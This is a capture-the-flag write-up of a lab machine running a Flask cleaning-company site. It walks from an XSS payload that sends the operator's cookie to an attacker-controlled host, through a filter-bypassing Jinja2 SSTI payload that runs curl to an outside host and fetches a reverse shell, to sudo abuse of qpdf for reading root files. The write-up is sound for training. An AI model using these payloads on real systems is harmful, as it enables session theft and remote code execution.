# PORT SCAN
*	**20** &#8594; SSH
*	**80** &#8594;  HTTP (Apache 2.4.52)

<br><br><br>

# ENUMERATION & USER FLAG
The website is a static presentation card of a cleaning company, nothing complicated but have a login form

![66beb196f8cddf5cb885c8d18bc8b54f.png](img/66beb196f8cddf5cb885c8d18bc8b54f.png)

The only thing we can do is a POST request to `/sendMessage` through the `/quote` page

![ccbc252b53584d155ce682d3309468fb.png](img/ccbc252b53584d155ce682d3309468fb.png)

Since I have nothing to play with we can try to perform XSS on this POST request, if we are lucky enough we may recover the cookie of the operator that received the quote request. Using a traditional XSS payload should be enough
```
<img src=x onerror=this.src='http://[IP]:[PORT]/?c='+document.cookie>
```

We can intercept the request and inject this payload on the service POST variable (URL encoded)

![952508809db943f6f68e99bbcbdd639c.png](img/952508809db943f6f68e99bbcbdd639c.png)

After sending the payload we can use netcat (or a simple PHP server) to intercept the request which will include the cookie

![c21ac6a0350698e1ca97a6b4b6c1e738.png](img/c21ac6a0350698e1ca97a6b4b6c1e738.png)

While I was doing this GoBuster retrive this list of web directories

![16b537f710034bf72f0a343693c10eb0.png](img/16b537f710034bf72f0a343693c10eb0.png)

`/dashboard` redirect us to the homepage, probably because we need to login and get the cookie to access it. I save my new captured cookie and use it anvigating directly to the dashboard page. After setting it up manually we have access to the restricted page

![fa2d8791a43189a9043a10e1bd829914.png](img/fa2d8791a43189a9043a10e1bd829914.png)

The dashboard permits to create some invoice and the QR code to use on the bill paper, it works in this way : 
1) Generate an Invoice (with the predefined services)
2) Generate a QR which would return you the link for the QR image
3) Use the brand new generated link to create the billing paper

The result would look like this

![b0726109e40d78518f95ebd0fffb03ee.png](img/b0726109e40d78518f95ebd0fffb03ee.png)

Cool, I have forgot to write that the webapp is using **<u>flask</u>** as web framework

![328ef03c51ebcaa2c3ed9ed225b9cfab.png](img/328ef03c51ebcaa2c3ed9ed225b9cfab.png)

This means SSTI could be possible and we can try to execute this. My favorite resource for SSTI is from [exploit notes](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/) where I tried this simple SSTI
```
{{request.application.__globals__.__builtins__.__import__('os').popen('curl [IP]/LOL').read()}}
```

I used during the step 3 using the payload as the URL of the QR

![3acabfae6f5c12acd7f1a5e28d47842a.png](img/3acabfae6f5c12acd7f1a5e28d47842a.png)

Looks cool but the page returned with **error 500**, an internal error is pretty strange behaviour but searching online this can be related with some filtering applied to mitigate SSTI. Don't lose theh ope yet becuase the resource I linked above offer a version that should be abl to bypass filtering

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl [IP]/LOL")|attr("read")()}}
```

Luckly this worked smoothly!

![9bed6cc8ee3cf262a7aaddc5817de710.png](img/9bed6cc8ee3cf262a7aaddc5817de710.png)

This is cool, we can execute whatever OS command not just curl so I can host in my local server a simple reverse shell and use the SSTI bypass filtering version to fetch it and execute it

![b297286a8673e43a5db377f754e6c66e.png](img/b297286a8673e43a5db377f754e6c66e.png)

We are spawned in `/opt/app` containing the file app.py which have some hardcoded credentials for the database. 

![8a778ae42303565375b03ff10dfb65c3.png](img/8a778ae42303565375b03ff10dfb65c3.png)

Looking through `systemctl` service status I know that mysql is running so I login to extract all the users data inside the database **CapiClean**. We have the hash f a username which exist in the Linux machine too

![a7bc4534240626a4c83f07287a1faf5a.png](img/a7bc4534240626a4c83f07287a1faf5a.png)

We can easily retrieve the plaintext 

![c9eceb72e4379ffdca51fc81c75ac10d.png](img/c9eceb72e4379ffdca51fc81c75ac10d.png)

Easy, we can SSH in as `consuela` and get the first flag

![897274290e8e114f80841eeb2e8abf21.png](img/897274290e8e114f80841eeb2e8abf21.png)

<br><br><br>

# PRIVILEGE ESCALATION

Now with this user we can run as **root** the tool **<u>qpdf</u>**

![29005c720eb82475f6ea006774b158b9.png](img/29005c720eb82475f6ea006774b158b9.png)

This CLI utility which can convert a PDF to another PDF adding attachment, metadata and more. Nothing complicated but I never use this tool so some RTFM was needed to figure out how to take the last flag. After reading the official documentation I was able to extract the root flag in this way

![6724f938af36ba814a365378ad292b3b.png](img/6724f938af36ba814a365378ad292b3b.png)

But what happened exactly? The first flag (`--empty`) specify that the PDF input is a (dummy) empty one while the second parameter specify the output file, in this case will read a file and every line would return as filename of the results. Here, thanks to the sudo permissions we can read the root flag and **<u>the generated PDF would be an empty one named as the flag content</u>**. Same thing can be applied to the private SSH key. I looked at ohers writeup and the "intended" way was to add an attachment to the PDF (SSH private key) and extract it with **binwalk**, you can look it through the other writeups
